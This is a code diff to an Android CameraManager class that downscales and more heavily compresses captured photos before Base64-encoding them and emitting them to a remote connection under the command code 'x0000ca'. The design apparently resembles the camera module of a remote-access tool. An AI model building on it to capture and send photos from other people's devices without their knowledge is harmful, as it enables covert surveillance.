@@ -588,11 +588,38 @@ public class CameraManager {
             
             Log.d(TAG, "Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());
             
+            // Scale down large images before compression to reduce size
+            int maxDimension = 1920; // Max width or height
+            Bitmap scaledBitmap = bitmap;
+            if (bitmap.getWidth() > maxDimension || bitmap.getHeight() > maxDimension) {
+                float scale = Math.min((float) maxDimension / bitmap.getWidth(), (float) maxDimension / bitmap.getHeight());
+                int newWidth = Math.round(bitmap.getWidth() * scale);
+                int newHeight = Math.round(bitmap.getHeight() * scale);
+                Log.d(TAG, "Scaling image from " + bitmap.getWidth() + "x" + bitmap.getHeight() + " to " + newWidth + "x" + newHeight);
+                scaledBitmap = Bitmap.createScaledBitmap(bitmap, newWidth, newHeight, true);
+                if (scaledBitmap != bitmap) {
+                    bitmap.recycle(); // Recycle original if we created a new scaled bitmap
+                }
+            }
+            
+            // Compress with aggressive quality setting (30% for smaller size)
+            // Try multiple quality levels to find best balance
             ByteArrayOutputStream bos = new ByteArrayOutputStream();
-            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos);
+            int quality = 30; // Start with 30% quality for smaller size
+            scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
             byte[] imageBytes = bos.toByteArray();
             
-            Log.d(TAG, "Compressed image size: " + imageBytes.length);
+            // If still too large (>2MB), reduce quality further
+            int maxSize = 2 * 1024 * 1024; // 2MB target
+            if (imageBytes.length > maxSize) {
+                bos.reset();
+                quality = 20; // More aggressive compression
+                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, quality, bos);
+                imageBytes = bos.toByteArray();
+                Log.d(TAG, "Image still large, reduced quality to " + quality + "%");
+            }
+            
+            Log.d(TAG, "Compressed image size: " + imageBytes.length + " bytes (quality: " + quality + "%)");
             
             // Base64 encode the image buffer for JSON serialization
             // JSONObject.put() with byte[] calls toString() which gives "[B@...", so we need Base64
@@ -601,16 +628,17 @@ public class CameraManager {
             JSONObject object = new JSONObject();
             object.put("image", true);
             object.put("buffer", base64Buffer);
-            object.put("width", bitmap.getWidth());
-            object.put("height", bitmap.getHeight());
+            object.put("width", scaledBitmap.getWidth());
+            object.put("height", scaledBitmap.getHeight());
             object.put("size", imageBytes.length);
+            object.put("quality", quality);
             object.put("timestamp", System.currentTimeMillis());
             
             ConnectionManager.emitResponse("x0000ca", object);
             Log.d(TAG, "Photo sent successfully via ConnectionManager, size: " + imageBytes.length + " bytes");
             
             // Clean up
-            bitmap.recycle();
+            scaledBitmap.recycle();
             bos.close();
         } catch (JSONException e) {
             Log.e(TAG, "Error sending photo (JSON)", e);
